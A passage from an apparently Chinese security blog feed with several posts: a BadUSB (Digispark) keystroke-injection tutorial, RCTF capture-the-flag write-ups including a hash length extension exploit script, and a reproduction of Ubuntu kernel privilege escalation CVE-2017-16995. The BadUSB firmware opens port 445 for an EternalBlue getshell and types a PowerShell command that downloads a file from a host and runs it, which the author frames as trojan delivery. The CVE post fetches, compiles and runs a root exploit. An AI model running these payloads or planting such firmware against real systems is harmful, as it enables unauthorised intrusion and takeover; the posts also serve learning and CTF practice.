class="hljs-comment">电脑识别为U盘的固件</span><span class="hljs-comment">固件信息</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>&gt;<span class="hljs-comment">U盘</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>&gt;<span class="hljs-comment">读取U盘的内容</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>&gt;<span class="hljs-comment">示U盘的内容</span></code></pre></p><p>构造badusb的固件让电脑识别为键盘<br><pre><code class="hljs undefined">           电脑识别为键盘的固件固件信息<span class="hljs-comment">--------------------------&gt;键盘</span></code></pre></p><p>再构造里面的内容<br><pre><code class="hljs undefined"><span class="hljs-comment">键盘</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>&gt;<span class="hljs-comment">模拟人敲命令</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>&gt;<span class="hljs-comment">根据写好的脚本敲命令</span></code></pre></p><h5 id="材料准备"><a href="#材料准备" class="headerlink" title="材料准备"></a>材料准备</h5><p>&emsp;&emsp;材料清单</p><ul><li>Digispark（也就是我们的主角）</li><li>Arduino（编写以及把脚本写到badusb里的程序）</li><li>脚本</li></ul><h4 id="开干"><a href="#开干" class="headerlink" title="开干"></a>开干</h4><h5 id="安装驱动"><a href="#安装驱动" class="headerlink" title="安装驱动"></a>安装驱动</h5><p>驱动下载地址，链接：<a href="http://pan.baidu.com/s/1i4K10dn" target="_blank" rel="noopener">http://pan.baidu.com/s/1i4K10dn</a> 密码：ilaf<br><pre><code class="hljs undefined">下载好后运行<span class="hljs-code">`DPinst64.exe`</span>，32位系统点击<span class="hljs-code">`DPinst.exe`</span>,一路回车等待安装完成下载编写程序的开发软件[<span class="hljs-string">https://www.arduino.cc/en/Main/Software</span>](<span class="hljs-link">https://www.arduino.cc/en/Main/Software</span>)运行Arduino，在首选项中添加开发板网址[<span class="hljs-string">http://digistump.com/package_digistump_index.json</span>](<span class="hljs-link">http://digistump.com/package_digistump_index.json</span>)(不同的板网址不同)</code></pre></p><p><img src="/img/2018-06-12/1.png" srcset="/img/static/loading.gif" alt="1"><br>在工具–&gt;开发板–&gt;开发板管理器里，下载这个驱动,等待下载完成即可<br><img src="/img/2018-06-12/2.png" srcset="/img/static/loading.gif" alt="2"><br><pre><code class="hljs undefined">选择<span class="hljs-keyword">Digispark开发板</span>编译器选择USBtinyISP</code></pre></p><p><img src="/img/2018-06-12/3.png" srcset="/img/static/loading.gif" alt="3"><br><img src="/img/2018-06-12/4.png" srcset="/img/static/loading.gif" alt="4"><br>到这里所有准备就做好了<br><img src="/img/2018-06-12/xixixi.png" srcset="/img/static/loading.gif" alt="xixixi"></p><h5 id="写脚本"><a href="#写脚本" class="headerlink" title="写脚本"></a>写脚本</h5><p>先看一眼商家给的教程<br><img src="/img/2018-06-12/jiaocheng.png" srcset="/img/static/loading.gif" alt="jiaocheng"><br><img src="/img/2018-06-12/emmm.jpg" srcset="/img/static/loading.gif" alt="emmm..."><br>在我的印象中应该是写一个木马进固件然后一插进电脑就黑进去的啊[捂脸][捂脸][捂脸]<br>算了，先一步一步跟着教程摸索下<br>最终代码如下，修改了一点点<br><pre><code class="hljs undefined"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">"DigiKeyboard.h"</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KEY_ESC     41</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KEY_BACKSPACE 42</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KEY_TAB     43</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KEY_PRT_SCR 70</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KEY_DELETE  76</span><span class="hljs-keyword">void</span> <span class="hljs-built_in">setup</span>() &#123;DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">5000</span>);DigiKeyboard.sendKeyStroke(<span class="hljs-number">0</span>);DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">5000</span>);DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">500</span>);DigiKeyboard.<span class="hljs-built_in">print</span>(F(<span class="hljs-string">"cmd"</span>));DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">500</span>);DigiKeyboard.sendKeyStroke(KEY_ENTER);DigiKeyboard.sendKeyStroke(KEY_ENTER);DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">500</span>);DigiKeyboard.<span class="hljs-built_in">print</span>(F(<span class="hljs-string">"echo"</span>));DigiKeyboard.sendKeyStroke(<span class="hljs-number">0</span>,MOD_SHIFT_LEFT);DigiKeyboard.<span class="hljs-built_in">print</span>(F(<span class="hljs-string">" "</span>));DigiKeyboard.<span class="hljs-built_in">print</span>(F(<span class="hljs-string">"Team233"</span>));DigiKeyboard.sendKeyStroke(<span class="hljs-number">0</span>,MOD_SHIFT_LEFT);DigiKeyboard.sendKeyStroke(KEY_ENTER);&#125;<span class="hljs-keyword">void</span> <span class="hljs-built_in">loop</span>() &#123;&#125;</code></pre></p><p>编译…没问题,上传…O98k<br><img src="/img/2018-06-12/7.png" srcset="/img/static/loading.gif" alt="7"><br>激动人心的时候到了，重新插进电脑去,10秒后…<br><img src="/img/2018-06-12/final.png" srcset="/img/static/loading.gif" alt="final"><br><img src="/img/2018-06-12/6.png" srcset="/img/static/loading.gif" alt="6"><br>到目前为止就算badusb就算做好了</p><h4 id="进阶教程"><a href="#进阶教程" class="headerlink" title="进阶教程"></a>进阶教程</h4><p>上面只是简单的尝试，接下来要进行更高级的用法<br><img src="/img/2018-06-12/1.gif" srcset="/img/static/loading.gif" alt="gif"><br>然鹅。。。。。<br><img src="/img/2018-06-12/8.png" srcset="/img/static/loading.gif" alt="8"><br><img src="/img/2018-06-12/9.jpg" srcset="/img/static/loading.gif" alt="9"><br>只有这么点容量怎么写马，而且商家没说，网上也找不到，怎么写。。。。。<br>忽然想起当时买这个的时候有好多个版本。。。<br>我绝对不会告诉你我是因为它<b><del>比较便宜</del></b>体积小迷你好看才买它的<br>经过我一番沉思与实践之后<br>如果目标是win7系统，我们可以利用终端打开445端口，然后使用永恒之蓝漏洞直接getshell<br>如果目标是win10，我们可以从我们搭好的服务器下载木马饭后执行木马程序，对win7也同样适用<br>cmd开启445端口命令如下<br><pre><code class="hljs undefined">netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-builtin-name">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">"open 445"</span> <span class="hljs-attribute">dir</span>=in <span class="hljs-attribute">action</span>=allow <span class="hljs-attribute">protocol</span>=TCP <span class="hljs-attribute">localport</span>=445</code></pre></p><p>编写好的脚本代码如下<br><pre><code class="hljs undefined"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">"DigiKeyboard.h"</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KEY_ESC     41</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KEY_BACKSPACE 42</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KEY_TAB     43</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KEY_PRT_SCR 70</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KEY_DELETE  76</span><span class="hljs-keyword">void</span> <span class="hljs-built_in">setup</span>() &#123;DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">5000</span>);DigiKeyboard.sendKeyStroke(<span class="hljs-number">0</span>);DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">5000</span>);DigiKeyboard.sendKeyStroke(KEY_M,MOD_GUI_LEFT);DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">500</span>);DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">500</span>);DigiKeyboard.<span class="hljs-built_in">print</span>(F(<span class="hljs-string">"cmd"</span>));DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">500</span>);DigiKeyboard.sendKeyStroke(KEY_ENTER);DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">500</span>);DigiKeyboard.<span class="hljs-built_in">print</span>(F(<span class="hljs-string">"netsh advfirewall firewall add rule name="</span>)); DigiKeyboard.<span class="hljs-built_in">print</span>(<span class="hljs-keyword">char</span>(<span class="hljs-number">34</span>)); DigiKeyboard.<span class="hljs-built_in">print</span>(F(<span class="hljs-string">"open445"</span>)); DigiKeyboard.<span class="hljs-built_in">print</span>(<span class="hljs-keyword">char</span>(<span class="hljs-number">34</span>)); DigiKeyboard.<span class="hljs-built_in">print</span>(F(<span class="hljs-string">" dir=in protocol=tcp localport=445 action=allow"</span>));DigiKeyboard.sendKeyStroke(KEY_ENTER);&#125;<span class="hljs-keyword">void</span> <span class="hljs-built_in">loop</span>() &#123;&#125;</code></pre></p><p>在kali下nmap可以看到445端口已经打开,msf直接漏洞利用就可以实现getshell<br><img src="/img/2018-06-12/445.png" srcset="/img/static/loading.gif" alt="445"><br>win10系统下载测试文件Team233.png的脚本代码如下<br><pre><code class="hljs undefined"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">"DigiKeyboard.h"</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KEY_ESC     41</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KEY_BACKSPACE 42</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KEY_TAB     43</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KEY_PRT_SCR 70</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KEY_DELETE  76</span><span class="hljs-keyword">void</span> <span class="hljs-built_in">setup</span>() &#123;DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">5000</span>);DigiKeyboard.sendKeyStroke(<span class="hljs-number">0</span>);DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">5000</span>);DigiKeyboard.sendKeyStroke(KEY_M,MOD_GUI_LEFT);DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">500</span>);DigiKeyboard.sendKeyStroke(<span class="hljs-number">0</span>,MOD_GUI_LEFT);DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">500</span>);DigiKeyboard.<span class="hljs-built_in">print</span>(F(<span class="hljs-string">"pow"</span>));DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">500</span>);DigiKeyboard.sendKeyStroke(MOD_SHIFT_LEFT);DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">500</span>);DigiKeyboard.sendKeyStroke(KEY_ENTER);DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">500</span>);DigiKeyboard.sendKeyStroke(<span class="hljs-number">0</span>,MOD_SHIFT_LEFT);DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">500</span>);DigiKeyboard.<span class="hljs-built_in">print</span>(F(<span class="hljs-string">"$client = new-object System.Net.WebClient"</span>));DigiKeyboard.sendKeyStroke(KEY_ENTER);DigiKeyboard.<span class="hljs-built_in">print</span>(F(<span class="hljs-string">" $client.DownloadFile('http://192.168.1.2/Team233.png', '."</span>)); DigiKeyboard.<span class="hljs-built_in">print</span>(<span class="hljs-keyword">char</span>(<span class="hljs-number">92</span>)); DigiKeyboard.<span class="hljs-built_in">print</span>(F(<span class="hljs-string">"Team233.png')"</span>));DigiKeyboard.sendKeyStroke(KEY_ENTER);DigiKeyboard.<span class="hljs-built_in">print</span>(F(<span class="hljs-string">"."</span>));DigiKeyboard.<span class="hljs-built_in">print</span>(<span class="hljs-keyword">char</span>(<span class="hljs-number">92</span>)); DigiKeyboard.<span class="hljs-built_in">print</span>(F(<span class="hljs-string">"Team233.png"</span>));DigiKeyboard.sendKeyStroke(KEY_ENTER);&#125;<span class="hljs-keyword">void</span> <span class="hljs-built_in">loop</span>() &#123;&#125;</code></pre></p><p>效果就参考我录的视频吧<br>链接: <a href="https://pan.baidu.com/s/1m8Ob16yuFoNVjzHoz6VrNQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1m8Ob16yuFoNVjzHoz6VrNQ</a> 密码: c9he<br><b>未经允许不得传播</b><br><b>本文仅供学习之用，不负任何法律责任<b></b></b></p>]]></content>
    
    
    
    <tags>
      
      <tag>硬件安全</tag>
      
      <tag>badusb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RCTF部分wirteup</title>
    <link href="/2018/05/22/writeup1/"/>
    <url>/2018/05/22/writeup1/</url>
    
    <content type="html"><![CDATA[<h3 id="总结RCTF的sign和git两道题"><a href="#总结RCTF的sign和git两道题" class="headerlink" title="总结RCTF的sign和git两道题"></a>总结RCTF的sign和git两道题</h3><a id="more"></a><h5 id="sign"><a href="#sign" class="headerlink" title="sign"></a>sign</h5><p>&emsp;&emsp;下载得到一个exe，用ida打开，这里选择第二个，如图<br><img src="/img/2018-05-22/ida.png" srcset="/img/static/loading.gif" alt="ida"><br>看到WinMain函数<br><img src="/img/2018-05-22/WinMain.png" srcset="/img/static/loading.gif" alt="WinMain"><br>按F5反编译就直接看到flag了<br><img src="/img/2018-05-22/f5.png" srcset="/img/static/loading.gif" alt="F5"></p><h5 id="git"><a href="#git" class="headerlink" title="git"></a>git</h5><p>&emsp;&emsp;下载下来是一个<code>.git</code>文件夹，推测跟git有关，随便打开文件看看看到一些信息<br><img src="/img/2018-05-22/git.png" srcset="/img/static/loading.gif" alt="git"><br>稍微了解git应该知道git有分支，回溯分支应该可以还原flag，查看logs<br><img src="/img/2018-05-22/flag.png" srcset="/img/static/loading.gif" alt="flag"><br>linux下使用下面的命令回溯<br><pre><code class="hljs undefined">git reset --hard f<span class="hljs-number">4</span>d<span class="hljs-number">0</span>f<span class="hljs-number">6</span>ddf<span class="hljs-number">6660</span>f<span class="hljs-number">5</span><span class="hljs-keyword">c</span><span class="hljs-number">9273</span><span class="hljs-keyword">c</span><span class="hljs-number">84</span>f<span class="hljs-number">3</span>de<span class="hljs-number">64840</span>a<span class="hljs-number">407</span>bef<span class="hljs-number">1</span></code></pre></p><p><img src="/img/2018-05-22/reset.png" srcset="/img/static/loading.gif" alt="reset"><br>cat flag.txt<br><img src="/img/2018-05-22/cat.png" srcset="/img/static/loading.gif" alt="cat"><br>更多的writeup参考大佬的吧，小弟能力有限，就只能<del>做出</del>复现这些<br>大佬的博客–&gt;<a href="https://delcoding.github.io/#blog" target="_blank" rel="noopener">这里</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>writeup</tag>
      
      <tag>逆向</tag>
      
      <tag>misc</tag>
      
      <tag>git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RCTF密码题cpushop解题过程</title>
    <link href="/2018/05/21/RCTF-cpushop/"/>
    <url>/2018/05/21/RCTF-cpushop/</url>
    
    <content type="html"><![CDATA[<h3 id="哈希长度拓展攻击学习"><a href="#哈希长度拓展攻击学习" class="headerlink" title="哈希长度拓展攻击学习"></a>哈希长度拓展攻击学习</h3><p>参考资料：<a href="哈希长度扩展攻击的简介以及HashPump安装使用方法">哈希长度扩展攻击的简介以及HashPump安装使用方法</a><br><a id="more"></a></p><h4 id="关于哈希长度拓展"><a href="#关于哈希长度拓展" class="headerlink" title="关于哈希长度拓展"></a>关于哈希长度拓展</h4><p>&emsp;&emsp;一开始我也是没有想法<del>甚至打算爆破的</del>，后来在师姐的指引下看了谋篇博客（见参考资料），就和师姐一起做出来了，写篇博客记录下。题目文件已上传到百度云,链接: <a href="https://pan.baidu.com/s/13d0Re1b_IIez-11dowmvtQ" target="_blank" rel="noopener">https://pan.baidu.com/s/13d0Re1b_IIez-11dowmvtQ</a> 密码: f1t2</p><h5 id="大概解题思路"><a href="#大概解题思路" class="headerlink" title="大概解题思路"></a>大概解题思路</h5><p>&emsp;&emsp;解释一下题目，linux下<code>nc cpushop.2018.teamrois.cn 43000</code>有四个选项，列出菜单，下订单，支付，退出，flag也在菜单里面，然后就是不择手段买到flag<br>&emsp;&emsp;但是我们的钱是<code>money = random.randint(1000, 10000)</code>这么来的flag价格是99999，也就是说正常方法我们是无论如何也买不到flag的,然而它检查price的方法用了for循环。。。<br><pre><code class="hljs python"><span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> parse_qsl(payment):    <span class="hljs-keyword">if</span> k == <span class="hljs-string">'product'</span>:        product = v    <span class="hljs-keyword">elif</span> k == <span class="hljs-string">'price'</span>:        <span class="hljs-keyword">try</span>:            price = int(v)        <span class="hljs-keyword">except</span> ValueError:            <span class="hljs-keyword">print</span> <span class="hljs-string">'Invalid Order!'</span>            <span class="hljs-keyword">return</span></code></pre></p><p>简而言之就是它会一直检查订单里的价格，比方说，你的订单是长介样子的<code>product=xxx&amp;price=99999&amp;price=1</code>上面代码出来的最终结果是price=1<br>signkey是一个8到32位的str<br><pre><code class="hljs python">signkey = <span class="hljs-string">''</span>.join([random.choice(string.letters+string.digits) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> xrange(random.randint(<span class="hljs-number">8</span>,<span class="hljs-number">32</span>))])</code></pre></p><p>order的格式<br><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">order</span><span class="hljs-params">()</span>:</span>    n = input_int(<span class="hljs-string">'Product ID: '</span>)    <span class="hljs-keyword">if</span> n &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> n &gt;= len(items):        <span class="hljs-keyword">print</span> <span class="hljs-string">'Invalid ID!'</span>        <span class="hljs-keyword">return</span>    payment = <span class="hljs-string">'product=%s&amp;price=%d&amp;timestamp=%d'</span> % (items[n][<span class="hljs-number">0</span>], items[n][<span class="hljs-number">1</span>], time.time()*<span class="hljs-number">1000000</span>)    sign = sha256(signkey+payment).hexdigest()    payment += <span class="hljs-string">'&amp;sign=%s'</span> % sign    <span class="hljs-keyword">print</span> <span class="hljs-string">'Your order:\n%s\n'</span> % payment</code></pre></p><h5 id="长度拓展攻击"><a href="#长度拓展攻击" class="headerlink" title="长度拓展攻击"></a>长度拓展攻击</h5><p>假设<br>密文A：xxxxx<br>明文B：ABCD<br>&emsp;&emsp;你知道(<code>密文A+明文B</code>)的哈希值和B，因为A我们不知道，爆破会比较困难，通过哈希长度拓展攻击可以修改B的内容<br>假设我们的带的订单内容如下<br><pre><code class="hljs undefined">product=Flag<span class="hljs-variable">&amp;price</span>=<span class="hljs-number">99999</span><span class="hljs-variable">&amp;timestamp</span>=<span class="hljs-number">1526903707553295</span><span class="hljs-variable">&amp;sign</span>=<span class="hljs-number">9226</span>bf4f86d5b02042281d87b1b104048c2da41f395350b6f68b05c5addc6fe4</code></pre></p><p>那么<br>明文B：<code>product=Flag&amp;price=99999&amp;timestamp=1526903707553295</code><br>sha256(密文A+明文B)：<code>9226bf4f86d5b02042281d87b1b104048c2da41f395350b6f68b05c5addc6fe4</code><br>如果我们可以把订单的明文添加一个&amp;price=1进去，那么pay的过程它经过for循环后最终价格会变化才能1，那么我们的目的就达到了<br>最终的一键代码如下，需要安装两个库文件<br><pre><code class="hljs undefined">pip <span class="hljs-keyword">install</span> pwntoolspip <span class="hljs-keyword">install</span> hashpumpy</code></pre></p><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> hashpumpy <span class="hljs-keyword">import</span> hashpump<span class="hljs-keyword">import</span> timenc = remote(<span class="hljs-string">"cpushop.2018.teamrois.cn"</span>,<span class="hljs-number">43000</span>)txt = nc.recvuntil(<span class="hljs-string">'Command:'</span>)<span class="hljs-keyword">print</span> txtnc.send(<span class="hljs-string">'2'</span>)<span class="hljs-keyword">print</span> nc.recvuntil(<span class="hljs-string">'ID:'</span>)nc.send(<span class="hljs-string">'9'</span>)code = nc.recvuntil(<span class="hljs-string">'Command:'</span>)<span class="hljs-keyword">print</span> codeflag = code[<span class="hljs-number">13</span>:<span class="hljs-number">134</span>]hexdata = flag[<span class="hljs-number">57</span>:]original = flag[<span class="hljs-number">0</span>:<span class="hljs-number">51</span>]add = <span class="hljs-string">'&amp;price=1'</span>dic = []<span class="hljs-keyword">print</span> original<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>,<span class="hljs-number">33</span>):    a,b = hashpump(hexdata,original,add,i)    order = b + <span class="hljs-string">'&amp;sign='</span> + a    nc.send(<span class="hljs-string">'3'</span>)    <span class="hljs-keyword">print</span> nc.recvuntil(<span class="hljs-string">'order:'</span>)    <span class="hljs-keyword">print</span> i    <span class="hljs-keyword">print</span> order    nc.send(order)    <span class="hljs-keyword">print</span> nc.recvuntil(<span class="hljs-string">'Command:'</span>)nc.interactive()</code></pre><p>tip:<code>hexdata</code>是A+B的哈希，<code>original</code>是B，<code>add</code>是要加的内容，<code>i</code>是A的长度。<br><strong>爆破A很困难，爆破A的长度就很简单了</strong><br>最后构造出来的订单式长这样子<br><pre><code class="hljs undefined">product=Flag&amp;price=<span class="hljs-number">99999</span>&amp;timestamp=<span class="hljs-number">1526818398651000</span>\<span class="hljs-keyword">x</span><span class="hljs-number">80</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">88</span>&amp;price=<span class="hljs-number">1</span>&amp;sign=b<span class="hljs-number">842</span>b<span class="hljs-number">4</span>baa<span class="hljs-number">0</span>d<span class="hljs-number">4405697</span>b<span class="hljs-number">740</span>a<span class="hljs-number">871</span>ae<span class="hljs-number">60</span>dd<span class="hljs-number">64617</span>cdfa<span class="hljs-number">1846132373e1</span>b<span class="hljs-number">3</span>a<span class="hljs-number">371</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>db<span class="hljs-number">3</span></code></pre></p>]]></content>
    
    
    
    <tags>
      
      <tag>writeup</tag>
      
      <tag>crypto</tag>
      
      <tag>RCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2017-16995本地提权复现</title>
    <link href="/2018/05/19/CVE-2017-16995/"/>
    <url>/2018/05/19/CVE-2017-16995/</url>
    
    <content type="html"><![CDATA[<h3 id="ubuntu本地提权漏洞复现"><a href="#ubuntu本地提权漏洞复现" class="headerlink" title="ubuntu本地提权漏洞复现"></a>ubuntu本地提权漏洞复现</h3><p>参考资料<br><a href="https://blog.csdn.net/DarkHQ/article/details/79622652" target="_blank" rel="noopener">Ubuntu内核提权:CVE-2017-16995漏洞复现</a><br><a href="http://www.freebuf.com/news/165608.html" target="_blank" rel="noopener">漏洞预警 | Ubuntu存在本地提权漏洞（附EXP及应对措施）</a><br><a href="https://www.exploit-db.com/exploits/40871/" target="_blank" rel="noopener">Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - ‘AF_PACKET’ Race Condition Privilege Escalation</a><br><a id="more"></a></p><h5 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h5><p>Linux Kernel Version 4.14-4.4<br>仅影响Ubuntu/Debian发行版本</p><h5 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h5><p>查看内核版本<br><pre><code class="hljs undefined"><span class="hljs-attribute">uname -r</span></code></pre></p><p><img src="/img/2018-05-19/uname.png" srcset="/img/static/loading.gif" alt="uname"><br>搜索版本<br><pre><code class="hljs undefined">apt-<span class="hljs-keyword">cache</span> <span class="hljs-keyword">search</span> linux</code></pre></p><p><img src="/img/2018-05-19/apt-cache.png" srcset="/img/static/loading.gif" alt="apt-cache"><br>下载4.4版本的内核<br><pre><code class="hljs undefined">sudo apt-get install linux-headers<span class="hljs-number">-4.4</span><span class="hljs-number">.0</span><span class="hljs-number">-81</span>-generic linux-image<span class="hljs-number">-4.4</span><span class="hljs-number">.0</span><span class="hljs-number">-81</span>-generic</code></pre></p><p><img src="/img/2018-05-19/sudo.png" srcset="/img/static/loading.gif" alt="sudo"><br>更换内核<br><pre><code class="hljs undefined">sudo nano <span class="hljs-regexp">/boot/g</span>rub<span class="hljs-regexp">/grub.cfg</span></code></pre></p><p><img src="/img/2018-05-19/nano.png" srcset="/img/static/loading.gif" alt="nano"><br>替换成下图<br><img src="/img/2018-05-19/4.4.0.png" srcset="/img/static/loading.gif" alt="4.4.0"><br>ctrl+o保存，ctrl+x退出，重启<br>到此，环境就配置完毕</p><h5 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h5><p>脚本下载<br><pre><code class="hljs undefined">wget http:<span class="hljs-regexp">//</span>cyseclabs.com<span class="hljs-regexp">/pub/u</span>pstream44.c</code></pre></p><p><img src="/img/2018-05-19/wget.png" srcset="/img/static/loading.gif" alt="wget"><br>编译<br><pre><code class="hljs undefined">gcc -o <span class="hljs-built_in">exp</span> upstream44.c</code></pre></p><p><img src="/img/2018-05-19/gcc.png" srcset="/img/static/loading.gif" alt="gcc"><br>运行<br><pre><code class="hljs undefined">./<span class="hljs-built_in">exp</span></code></pre></p><p><img src="/img/2018-05-19/root.png" srcset="/img/static/loading.gif" alt="root"><br>可以看到前面的用户名已经从ubuntu变成了root，可以执行任何需要超级权限的命令</p><h5 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h5><p>升级Linux Kernel 版本(需重启)</p><pre><code class="bash"><span class="built_in">echo</span> <span class="string">"deb http://archive.ubuntu.com/ubuntu/ xenial-proposed restricted main multiverse universe"</span> &gt; /etc/apt/sources.list &amp;&amp; apt update &amp;&amp; apt install linux-image-4.4.0-117-generic</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞</tag>
      
      <tag>CVE</tag>
      
      <tag>提权</tag>
      
      <tag>ubuntu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用yilia主题</title>
    <link href="/2018/05/10/meihua/"/>
    <url>/2018/05/10/meihua/</url>
    
